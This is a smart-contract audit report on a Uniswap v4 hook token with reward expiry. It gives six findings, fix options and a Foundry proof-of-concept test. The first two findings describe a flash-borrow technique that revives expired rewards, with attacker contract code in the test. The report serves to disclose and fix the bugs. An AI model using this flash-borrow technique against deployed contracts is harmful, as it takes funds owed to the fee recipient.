# Audit report

> Final check 2 for The Zero Person Billion Dollar Company ($COMPANY) on Robinhood Chain (4663), after IMD Swarm audit 78c00339, re-check f1d5def3 and final check 363ab052. AUDIT.md sections 4 to 6 map every finding to its fix and its test.
>
> What the contracts are for: CompanyToken is a fixed 1,000,000,000 supply ERC-20; its ownership is renounced in the constructor. CompanyHook owns the token's only Uniswap v4 pool, paired with IMD, with liquidity locked forever, and takes 4% of every swap in that pool: 1% to the protocol, 3% to holders. Holder fees are split 50% IMD and 10% each to NVDA, GOOGL, AAPL, GME and MSTR Robinhood stock tokens, bought IMD -> USDG -> stock at the start of every claim(), with each purchase checked against Chainlink. Only wallets holding at least 100,000 earn. If a wallet goes more than 7 days without claiming, buying, selling or sending, its unclaimed rewards older than 7 days expire.
>
> Changed since 363ab052; review these hardest:
> 1. _transfer now forfeits the expired rewards of a sender (or of a receiver that pulled with transferFrom) who has been inactive for more than 7 days, into recycledHeld, before the timer resets (bookkeeping only, no external call). Check solvency, the weight and correction order in _transfer, and that no transfer can revert or be blocked by it.
> 2. claim() and recycle() revert while the PoolManager is unlocked.
> 3. A feed dead or unusable for DEAD_AFTER (30 days), or an IMD/USDG pool with no liquidity at its price for 30 days (imdPoolEmptySince), now pays rounds as IMD. Can anyone trigger this early, or keep a healthy stock from converting?
> 4. A stock pool that can take less than 1% of a round now counts as empty and the round is paid as IMD.
> 5. minStockOut removes the pool's own fee before the 3% tolerance.
> 6. A real buy is activity again: CompanyHook.afterSwap calls CompanyToken.markActive(trader) on buys (hook-only; trader = the user CompanyRouter/CompanyEthRouter report, else tx.origin), which forfeits already-expired rewards first and resets the timer. Receipts from the PoolManager alone still don't count (78c00339 finding 4). Can anyone mark another wallet active, or does this reopen any expiry bypass?
>
> Please confirm these, check that nothing broke the solvency of the six reward assets, the flash-borrow guard, the 100,000 minimum, expiry or the scanner-relevant properties (no external calls in transfers), and report anything new.
>
> Tests: cd contracts; git submodule update --init --recursive; forge test. Fork test (live Chainlink feeds and pools): FORK_RPC=https://robinhood.drpc.org forge test --mc CompanyForkTest.

| | |
|---|---|
| Repository | https://github.com/imdmaxi/IMDINDEX.git |
| Commit | `331230c2d46e1d6079bcafb2caba8ce288328a5b` |
| Job | `882666b4-08cf-476b-ac4f-7c2e44399300` |
| Judged | 2026-10-07 13:05 UTC |
| Findings | 2 high · 1 medium · 1 low · 2 info |

Four agents audited the code as it is at `331230c`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. High: _transfer forfeits with the live weight and has no unlock guard: a send while holding flash-borrowed pool $COMPANY revives an inactive wallet's expired rewards at zero cost (reopens 363ab052 findings

`contracts/src/CompanyToken.sol:366`

```
            if (!fromSystem && _inactive(from)) _forfeit(from);
```

The 363ab052 finding-1 fix makes _transfer call _forfeit(from) (line 366; line 367 for a receiver that pulls with transferFrom) before the send resets lastActive. _forfeit takes the amount from expiredRewardsOf, whose non-expiring 'recent' part is (magnifiedRewardPerShare - magAt(now - 7d - 1)) x weightOf(holder) / MAGNITUDE with weightOf read from the CURRENT balance (line 548). claim() and recycle() refuse to run while the PoolManager is unlocked for exactly this reason (363ab052 finding 2), but transfers must work mid-unlock (every sell is one), and nothing in _transfer distinguishes a balance that was taken from the PoolManager a moment earlier. A receipt from the PoolManager is deliberately not activity and forfeits nothing (78c00339 finding 4), so inside its own unlock a contract can pm.take() the pool's whole $COMPANY (about 1e9 tokens, most of the supply) to the inactive wallet, then return it with transferFrom(wallet, PoolManager) (the wallet pre-approved the helper; approve is not activity) or have the wallet send 1 wei. That send runs _forfeit(wallet) with weight = the borrowed balance: 'recent' becomes (last-7-day per-share growth) x (nearly the whole supply), which is at least the TOTAL IMD distributed to all holders in the last 7 days, so it exceeds the wallet's backlog and expired = 0 for every asset. Nothing is forfeited, lastActive is reset, the tokens go back and the unlock settles. Afterwards expiredRewardsOf is 0 (timer fresh) and a later claim() pays the entire backlog in all six assets. Preconditions: one distribution of each asset inside the last 7 days (any traded token has one for IMD; a claim or convert in the window gives one per stock) and the pool holding most of the supply (always). Cost: gas only; no swap, no fee, no capital. Victim: the fee recipient, who should have received the expired rewards. AUDIT.md section 7 says the flash-loan variant is closed because claim and recycle refuse to run mid-unlock; the transfer path reopens it. Reproduced with the specialist proof .imd/reads/proofs/Proof_37c04bb2b060.t.sol (fails here: 'expired rewards must be forfeited by the send: 0 != 599999999999999999') and with the attached fix-agnostic test. Merged from audit_math, audit_flow (second finding), audit_economics (first finding) and audit_permissions, which all describe this path. The companion markActive path is reported separately (next finding) because a hook-side fix alone does not close this one. Fix options that keep transfers free of external calls: (a) record in transient storage the $COMPANY each address received from the PoolManager in this transaction (moving the tag along when forwarded, clearing it when returned to the PoolManager) and have expiredRewardsOf/_forfeit use weight minus that amount, so a borrowed balance never counts toward 'recent' (tokens just bought did not earn in the window either, so the estimate stays holder-favourable); or (b) never reactivate an already-inactive wallet from a send unless msg.sender is CompanyRouter/CompanyEthRouter (whose unlock cannot be nested, so no borrow is possible): leave lastActive untouched and forfeit nothing, so the wallet comes back only through claim() (unlock-guarded) or a router trade. Option (b) changes the documented 'sending brings a wallet back' rule and test_final1. A staticcall to poolManager.isUnlocked() inside _transfer (skip forfeit and reset when unlocked and msg.sender is not a router) also works but adds the external call the scanner notes avoid. The attached proof passes under (a), (b) or the isUnlocked variant.

**Reproduction**

Setup as in Company.t.sol (IMD/USDG 10,000e18 liquidity, start mcap 306 IMD). alice buys 20 IMD, bob buys 20 IMD (alice's own deferred holder fee and bob's are both distributed to alice, the only holder: 0.6 IMD). warp +8 days; bob buys 10 IMD (one distribution inside alice's last 7 days). expiredRewardsOf(alice,0) = 599999999999999999, withdrawableRewardOf(alice,0) = 0.679e18. alice approves helper F (approve is not activity). F.run(alice): pm.unlock -> pm.take($COMPANY, alice, balanceOf(pm)) -> pm.sync -> token.transferFrom(alice, pm, borrowed) -> pm.settle. Expected: the expired 0.6 IMD is forfeited into recycledHeld[0] before the timer resets (as in test_final1_selfTransferForfeitsExpiredFirst), or the timer is left alone; alice's next claim pays at most 0.079 IMD. Actual: recycledHeld(0) == 0, lastActive(alice) == block.timestamp, expiredRewardsOf(alice,0) == 0 and alice's next claim() pays 0.679 IMD, the full backlog; recycle(alice) moves nothing. Run: cd contracts; forge test --match-path test/scratch/TransferFlashBorrow.t.sol (fails: 'the expired backlog must stay expired or be held for the protocol, not revived: 0 != 599999999999999999'). The same test passes with the 49 existing tests once mid-unlock sends by untrusted callers stop reactivating an inactive wallet or once the forfeit weight excludes tokens taken from the PoolManager in the same transaction.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";

import {CompanyHook} from "src/CompanyHook.sol";
import {CompanyToken} from "src/CompanyToken.sol";
import {CompanyRouter} from "src/CompanyRouter.sol";
import {DeployLib} from "script/DeployLib.sol";

contract SErc20 {
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract SFeed {
    function decimals() external pure returns (uint8) {
        return 8;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 1e8, block.timestamp, block.timestamp, 1);
    }
}

/// @notice Inside one unlock: borrows the pool's $COMPANY to `holder` (a receipt from the PoolManager is not activity
///         and forfeits nothing), then repays it with transferFrom(holder). That repayment is the holder's "send", so
///         _transfer forfeits with the borrowed tokens counted as weight and then resets the holder's timer.
contract FlashSender is IUnlockCallback {
    IPoolManager immutable pm;
    CompanyToken immutable t;
    address holder;

    constructor(IPoolManager pm_, CompanyToken t_) {
        pm = pm_;
        t = t_;
    }

    function run(address holder_) external {
        holder = holder_;
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        uint256 borrowed = t.balanceOf(address(pm));
        pm.take(Currency.wrap(address(t)), holder, borrowed);
        pm.sync(Currency.wrap(address(t)));
        t.transferFrom(holder, address(pm), borrowed);
        pm.settle();
        return "";
    }
}

contract TransferFlashBorrowTest is Test {
    uint256 constant SUPPLY = 1_000_000_000e18;
    int24 constant FULL_90 = 887220;
    int24 constant FULL_60 = 887220;

    PoolManager pm;
    SErc20 imd;
    CompanyHook hook;
    CompanyToken token;
    CompanyRouter router;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address owner = makeAddr("owner");
    address feeRecipient = makeAddr("feeRecipient");

    function _key(address a, address b, uint24 fee, int24 ts) internal pure returns (PoolKey memory) {
        (address c0, address c1) = a < b ? (a, b) : (b, a);
        return PoolKey(Currency.wrap(c0), Currency.wrap(c1), fee, ts, IHooks(address(0)));
    }

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new SErc20();
        SErc20 usdg = new SErc20();
        PoolModifyLiquidityTest lp = new PoolModifyLiquidityTest(pm);
        imd.mint(address(this), 10_000_000e18);
        usdg.mint(address(this), 10_000_000e18);
        imd.approve(address(lp), type(uint256).max);
        usdg.approve(address(lp), type(uint256).max);

        PoolKey memory imdUsd = _key(address(imd), address(usdg), 9000, 90);
        pm.initialize(imdUsd, TickMath.getSqrtPriceAtTick(0));
        lp.modifyLiquidity(imdUsd, ModifyLiquidityParams(-FULL_90, FULL_90, 10_000e18, 0), "");

        CompanyToken.Pool[5] memory pools;
        address[5] memory stocks;
        address[5] memory feeds;
        for (uint256 i; i < 5; i++) {
            SErc20 s = new SErc20();
            s.mint(address(this), 10_000_000e18);
            s.approve(address(lp), type(uint256).max);
            PoolKey memory k = _key(address(usdg), address(s), 3000, 60);
            pm.initialize(k, TickMath.getSqrtPriceAtTick(0));
            lp.modifyLiquidity(k, ModifyLiquidityParams(-FULL_60, FULL_60, 1_000_000e18, 0), "");
            pools[i] = CompanyToken.Pool(3000, 60);
            stocks[i] = address(s);
            feeds[i] = address(new SFeed());
        }

        bytes memory initCode = abi.encodePacked(
            type(CompanyHook).creationCode,
            abi.encode(
                pm,
                address(imd),
                owner,
                feeRecipient,
                DeployLib.startTickForMarketCap(306e18, SUPPLY),
                CompanyHook.ImdEthPool(10_000, 100, address(0))
            )
        );
        uint160 flags = uint160((1 << 13) | (1 << 11) | (1 << 7) | (1 << 6) | (1 << 3) | (1 << 2));
        (bytes32 salt, address expected) = DeployLib.mineSalt(address(this), flags, initCode, 0);
        address deployed;
        assembly {
            deployed := create2(0, add(initCode, 0x20), mload(initCode), salt)
        }
        require(deployed == expected, "hook address");
        hook = CompanyHook(payable(deployed));
        router = CompanyRouter(payable(hook.router()));
        token = new CompanyToken(
            address(hook), address(usdg), CompanyToken.Pool(9000, 90), stocks, pools, address(new SFeed()), feeds
        );
        vm.prank(owner);
        hook.openPool(address(token));

        address[2] memory users = [alice, bob];
        for (uint256 i; i < 2; i++) {
            imd.mint(users[i], 1_000_000e18);
            vm.prank(users[i]);
            imd.approve(address(router), type(uint256).max);
        }
    }

    function _buy(address who, uint256 imdIn) internal {
        vm.prank(who);
        router.buy(address(token), imdIn, 0, block.timestamp);
    }

    function test_sendWithBorrowedPoolTokensRevivesExpiredRewards() public {
        _buy(alice, 20e18);
        _buy(bob, 20e18);
        vm.warp(block.timestamp + 8 days);
        _buy(bob, 10e18); // one distribution inside alice's last 7 days

        uint256 expired = token.expiredRewardsOf(alice, 0);
        uint256 withdrawable = token.withdrawableRewardOf(alice, 0);
        assertGt(expired, 0, "alice has expired IMD rewards");

        FlashSender f = new FlashSender(IPoolManager(address(pm)), token);
        vm.prank(alice);
        token.approve(address(f), type(uint256).max); // approve is not activity
        f.run(alice); // no capital: the pool's tokens are borrowed and returned in the same unlock

        // Expected: the backlog that had expired is either still expired or held for the protocol (as after the
        // 1-wei self-transfer of test_final1_selfTransferForfeitsExpiredFirst). Actual: it is withdrawable again.
        assertEq(
            token.expiredRewardsOf(alice, 0) + token.recycledHeld(0),
            expired,
            "the expired backlog must stay expired or be held for the protocol, not revived"
        );
        vm.prank(alice);
        uint256[6] memory paid = token.claim();
        assertEq(paid[0], withdrawable - expired, "only the last 7 days may be paid");
    }
}
```

### 2. High: afterSwap calls markActive(tx.origin) inside the swapper's own unlock: a dust buy made while holding flash-borrowed pool $COMPANY resets an inactive EOA's timer without forfeiting (same flash bypass t

`contracts/src/CompanyHook.sol:328`

```
        if (isBuy) CompanyToken(t).markActive(trader);
```

A hook callback runs only inside an unlock, so CompanyToken.markActive(trader) (CompanyToken.sol:399-404) always executes mid-unlock. For a swap whose sender is not CompanyRouter/CompanyEthRouter the trader is tx.origin (line 326), and that swapper controls the whole unlock: before swapping it can pm.take() the pool's $COMPANY to tx.origin (a receipt from the PoolManager is not activity and forfeits nothing). markActive then evaluates _inactive(buyer) -> _forfeit(buyer) with weightOf(tx.origin) inflated by the borrowed tokens, 'recent' exceeds the backlog, nothing is forfeited and lastActive[buyer] = block.timestamp. The helper repays with transferFrom(eoa, pm, borrowed - bought) (one-time approval of the attacker's own helper; the wallet is already active at that point so no forfeit happens there either), returns the output and settles. Cost: a 0.001 IMD buy (0.00004 IMD fee) plus gas; the borrow is free under v4 flash accounting. Precondition as in the previous finding: one distribution of each asset inside the last 7 days such that (pool balance / eligibleSupply) x the asset credited in the window >= the wallet's backlog, which holds for ordinary holders and which the attacker can create with a small buy from a second wallet. The router paths are safe: PoolManager.unlock reverts AlreadyUnlocked when nested, so nobody can hold borrowed tokens during a CompanyRouter/CompanyEthRouter unlock. The claim()/recycle() isUnlocked() guard cannot be applied to markActive, which is by construction mid-unlock. Merged from audit_flow (first finding), audit_economics (second finding) and the markActive halves of audit_math and audit_permissions. Fix options that keep the agreed design: (a) in afterSwap call markActive only when sender == router || sender == ethRouter, and document that buys through other routers do not refresh the timer (this is already the case for contract wallets, see the info finding below); or (b) pass trusted = (sender == router || sender == ethRouter) and have markActive leave an inactive buyer untouched when !trusted (an active buyer is still refreshed; an inactive one comes back through claim() or a router trade); or (c) the transient-storage 'received from the PoolManager this transaction' tag of the previous finding, which makes the forfeit weight borrow-proof for both paths at once. Option (a) alone does not close the previous finding; a root-cause fix (c) closes both. The attached proof records the state right after the buy, so it passes under any of (a), (b) or (c) independently of how the transfer path is fixed.

**Reproduction**

Setup as in Company.t.sol. alice buys 20 IMD; bob buys 20 IMD; warp +8 days; bob buys 10 IMD. expiredRewardsOf(alice,0) = 599999999999999999, lastActive(alice) = 8 days ago. alice approves helper F for $COMPANY and signs a transaction calling F.run(alice) (tx.origin = alice; the test uses vm.prank(alice, alice)). In unlockCallback: pm.take($COMPANY, alice, balanceOf(pm)); pm.swap(hook pool, exact-in 1e15 IMD, hookData ''); the state is recorded; the IMD is settled; transferFrom(alice, pm, borrowed - bought); settle. Expected (as for a router buy in test_expiry_giftDoesNotResetTimer_buyDoes_afterForfeiting): right after the buy either lastActive(alice) is unchanged or recycledHeld(0) == 0.6e18. Actual: lastActive(alice) == block.timestamp and recycledHeld(0) == 0 (the hook's own Trade event logs alice as the buyer); after the transaction expiredRewardsOf(alice,0) == 0 and the 0.6 IMD backlog is claimable again; recycle(alice) moves nothing. Run: cd contracts; forge test --match-path test/scratch/MarkActiveFlashBorrow.t.sol (fails: 'the buy reset the timer with nothing forfeited: the expired backlog was revived'); it passes once afterSwap only marks router-reported buyers (verified against this tree with that one-line change: proof passes, 49/49 existing tests pass) or once the forfeit weight excludes tokens taken from the PoolManager in the same transaction.

### 3. Medium: IMD/USDG pool counts as empty only when maxConvert() is exactly 0: a dust position (10,000 liquidity units, 10,000 wei each side) stops the 30-day IMD fallback from ever firing and turns every round i

`contracts/src/CompanyToken.sol:636`

```
        if (cap == 0) {
```

_convertAll detects an IMD/USDG pool with no liquidity at its price as cap == 0, where cap = maxConvert() / 5 and maxConvert() = in-range virtual IMD depth x 25 / 10,000 (capped at 20 IMD). cap is zero only while that depth is below 2,000 wei. Any full-range position of 10,000 liquidity units (10,000 wei of IMD and 10,000 wei of USDG at a 1:1 price, i.e. nothing) keeps maxConvert() at 25 wei and cap at 5 wei: imdPoolEmptySince is cleared (lines 641-643) or never started, the DEAD_AFTER fallback of 363ab052 finding 3 can never trigger, and each stock's round proceeds with imdIn = 5 wei. Because cap / 100 == 0 the stock-pool emptiness floor of finding 4 (line 657) is disabled as well, and convertStock(a, 5) either buys a few wei of stock or reverts Slippage and _fallBackToImd pays 5 wei; either way lastConvert[a] is set, the per-minute slot is consumed, and the reserves (10% x 5 of all holder fees since the real liquidity left) stay locked: 40 daily rounds move 200 wei of a 6 IMD reserve. This is the harm 363ab052 finding 3 (Medium) was fixed for, reachable with liquidity that abandoned pools commonly keep (dust left by rounding or never-withdrawn positions) or that anyone can add for the cost of gas. The symmetric check for stock pools uses a 1%-of-round floor; the first hop uses == 0. No third-party loss (value stays in pendingConvert), hence Medium like the original rather than High. Fix: treat the IMD/USDG pool as empty when maxConvert() is below a meaningful floor, e.g. maxConvert() < MAX_ROUND_IMD / 100 (0.2 IMD, about 80 IMD of virtual depth against ~19,750 at launch), so dust depth starts and keeps the imdPoolEmptySince clock and rounds are not spent on sub-dust swaps; keep the floor well below the real pool's depth so a healthy pool is never declared empty.

**Reproduction**

Setup as in Company.t.sol: alice and bob buy 1,000 IMD each (pendingConvert[a] = 6e18 for every stock). Remove the 10,000e18 full-range IMD/USDG liquidity; warp +1 minute; convert() sets imdPoolEmptySince = now. Anyone adds a full-range position of 10,000 liquidity units (the test measures 10,000 wei of IMD and 10,000 wei of USDG spent). Now maxConvert() == 25 wei, cap == 5 wei. warp +31 days, refresh feeds, convert(). Expected (README and AUDIT.md section 6 finding 3): the pool has had no usable liquidity for 30 days, so each stock's 4 IMD round is paid to holders as IMD (owed(0) grows by 20e18) and imdPoolEmptySince stays set. Actual: imdPoolEmptySince == 0, owed(0) unchanged, pendingConvert(1) moves by 5 wei, lastConvert(1) consumed. A second test runs 40 daily rounds with the dust position in place: pendingConvert(1) == 5999999999999999800 afterwards and imdPoolEmptySince == 0 throughout. Run: cd contracts; forge test --match-path test/scratch/Checks.t.sol --match-test dustImdPool -vv (test_dustImdPool_keeps30DayFallbackFromFiring fails with 'after 30 days without usable liquidity every stock round is paid as IMD: 0 != 20000000000000000000').

### 4. Low: A feed that is unusable for a single round (reverting call, short return data, answer <= 0) is treated as dead at once, not after DEAD_AFTER, so that stock's round is paid as IMD immediately

`contracts/src/CompanyToken.sol:824`

```
            return answer <= 0 || updatedAt == 0 ? type(uint256).max : 0;
```

The request, README and the DEAD_AFTER NatSpec say a feed 'dead or unusable for DEAD_AFTER (30 days)' hands rounds to holders as IMD, and that a stale feed holds the stock. In code _feedAge returns type(uint256).max whenever latestRoundData reverts or returns fewer than 160 bytes (line 821) or reports answer <= 0 or updatedAt == 0 (line 824), and _feedsDead compares that to DEAD_AFTER (line 806), so a feed that is unusable right now is dead for this round: _convertAll takes the !_feedsFresh branch and calls _fallBackToImd(a, imdIn) at once (lines 664-667). Only the stale case (successful call, positive answer, updatedAt older than 4 days) gets the 30-day grace. Chainlink aggregator proxies can revert ('No data present') or report a zero answer transiently during an aggregator swap or incident; during such a window every claim() or convert() (one round per minute per stock) credits up to 4 IMD of that stock's reserve to holders as IMD, and a USDG/USD feed doing so affects all five stocks. Holders receive the value as IMD, so the loss is the stock exposure, not funds, and nobody outside Chainlink can trigger it, hence Low. Merged from audit_math, audit_flow and audit_economics (identical finding). Fix: only treat an unusable feed as dead after it has been unusable for DEAD_AFTER, e.g. remember per feed the last time it returned a usable answer (updated whenever _readFeed succeeds) and in _feedAge return block.timestamp - lastGood[feed] for an unusable response (max only when it has never been readable); or treat an unusable feed as merely stale (continue) and reserve the dead branch for a usable feed whose updatedAt is older than DEAD_AFTER.

**Reproduction**

Setup as in Company.t.sol: alice and bob buy 1,000 IMD each (pendingConvert[1] = 6e18, deep pools, all feeds fresh). warp +1 minute. Input A: the NVDA feed returns answer = 0 with updatedAt = block.timestamp (MockFeed.set(0, block.timestamp)); call convert(). Input B: the NVDA feed's latestRoundData reverts (vm.etch of a reverting feed); call convert(). Expected in both cases (as for a stale feed in test_recheck1_staleFeed_holdsThatStock): NVDA skipped, pendingConvert(1) still 6e18, owed(0) unchanged, and only after 30 days of that is a round paid as IMD. Actual in both cases: pendingConvert(1) == 2e18 and owed(0) grows by 4e18 in the same call (ConversionFailed(1, 4e18)); the next minute's call converts the next 4 IMD the same way while the outage lasts. Run: cd contracts; forge test --match-path test/scratch/Checks.t.sol --match-test Feed_isDeadAtOnce -vv (both tests fail with '... should hold the stock until DEAD_AFTER: 2000000000000000000 != 6000000000000000000').

### 5. Info: A contract wallet's buy through any router other than CompanyRouter/CompanyEthRouter is credited as activity to tx.origin (its relayer or signer), never to the buyer

`contracts/src/CompanyHook.sol:326`

```
            : tx.origin;
```

For swaps whose sender is not CompanyRouter/CompanyEthRouter, afterSwap marks tx.origin active (lines 324-328). A smart-contract wallet (Safe, ERC-4337 account, any contract) that buys $COMPANY through the Universal Router, an aggregator or PoolSwapTest can never be tx.origin: markActive(relayer or bundler) resets a timer that owns no rewards, and the buyer's lastActive is untouched. Receipts from the PoolManager are deliberately not activity (78c00339 finding 4), so such a buyer has no buy-based path back and must claim or send to stay active; the README's rule 'buying keeps a wallet active' does not hold for that class. The NatSpec and README do say 'otherwise the transaction's signer', so this is a documented limit; no funds are at risk and nobody can exploit it (the fallback never credits anyone with rewards, and marking a wallet active only ever moves its expired part to the protocol first). Reported as information: either state plainly that only EOAs and CompanyRouter/CompanyEthRouter buyers get buy activity, route contract wallets through the Company routers on the website, or (if the hook stops marking non-router buyers, as the second finding's option (a) suggests) document that only router buys count. Merged from audit_math (info) and audit_permissions (low); rated info because the behaviour is documented and harmless to third parties.

**Reproduction**

Setup as in Company.t.sol. Contract wallet W (any contract address) holds IMD and buys 20 IMD of $COMPANY through PoolSwapTest in a transaction signed by relayer R (vm.prank(W, R)); its first receipt makes lastActive(W) = t0. bob buys 20 IMD (a distribution). warp +6 days; W buys 1 IMD again through PoolSwapTest with tx.origin = R. Expected: lastActive(W) == now. Actual: lastActive(W) == t0 and lastActive(R) == now. warp +2 days: expiredRewardsOf(W, 0) > 0 although W bought two days earlier, and anyone can recycle it. Run: cd contracts; forge test --match-path test/scratch/Checks.t.sol --match-test contractWalletBuy -vv (the test asserts the actual behaviour and passes; its logs show lastActive(wallet) = 1800000000, lastActive(signer) = 1800518400).

### 6. Info: imdPoolEmptySince is only cleared by a convert that sees liquidity, so a pool that had liquidity for the whole 30 days can still be declared dead if it is empty at two conversions 30 days apart with n

`contracts/src/CompanyToken.sol:637`

```
            if (imdPoolEmptySince == 0) imdPoolEmptySince = block.timestamp;
```

The 30-day clock starts at the first _convertAll that reads cap == 0 and is reset only by a later _convertAll that reads cap > 0 (lines 636-643). Time during which the pool had liquidity but nobody called claim() or convert() does not refresh it. If the pool is seen empty at its price at two conversions more than 30 days apart with no conversion in between, the second one pays all five stocks' rounds (up to 20 IMD) as IMD although the pool was usable the whole time. On a live token this needs 30 days without any claim (every claim converts) and the pool empty at its price at both instants, so it is not triggerable early and not practical against a traded pool; holders still receive full value as IMD, which section 7 already accepts for purchases made to fail on purpose. Reported for completeness because the guarantee as written ('no liquidity at its price for 30 days') is not what is measured. Possible tightening: require the empty observation to be re-confirmed within a window (e.g. clear imdPoolEmptySince when more than DEAD_AFTER has passed since it was last confirmed empty, re-arming the clock instead of firing), or let any successful stock conversion clear it.

**Reproduction**

Setup as in Company.t.sol: alice and bob buy 1,000 IMD each; warp +1 minute; remove all IMD/USDG liquidity; convert() sets imdPoolEmptySince = now; re-add the 10,000e18 liquidity. warp +31 days with no claim or convert; refresh feeds; remove the liquidity again and call convert(). Expected: no fallback (the pool had liquidity for the whole 31 days). Actual: owed(0) grows by 20e18 (five 4 IMD rounds paid as IMD). Run: cd contracts; forge test --match-path test/scratch/Checks.t.sol --match-test imdPoolEmptySince -vv (fails with 'pool had liquidity for the whole period: no fallback: 50000000000000000000 != 30000000000000000000').

---

Judge's submission `8b23efd7b2c13a7d18e8dd40fe47b9231d3927b1d4801dea07b552c299abb0bf`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
